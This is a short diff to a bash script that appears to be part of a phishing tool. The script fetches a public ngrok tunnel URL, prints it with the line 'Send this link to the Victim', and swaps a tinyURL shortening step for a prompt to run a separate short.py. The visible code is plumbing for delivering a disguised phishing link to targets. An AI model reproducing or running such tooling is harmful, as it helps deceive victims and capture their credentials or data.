@@ -423,8 +423,7 @@ sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
-tinyURL="$(curl -s "http://tinyurl.com/create.php?url=$link"|grep "The following URL" -A3|tail -1|awk -F\> '{print $3}'|sed 's,</b,,')"
-printf "\e[1;92m[\e[0m*\e[1;92m] Use shortened link instead:\e[0m\e[1;77m %s\e[0m\n" $tinyURL
+printf "\e[1;92m[\e[0m*\e[1;92m] For short url run "python3 short.py <URL>"\e[0m\e[1;77m %s\e[0m\n"
 echo ""
 
 checkfound
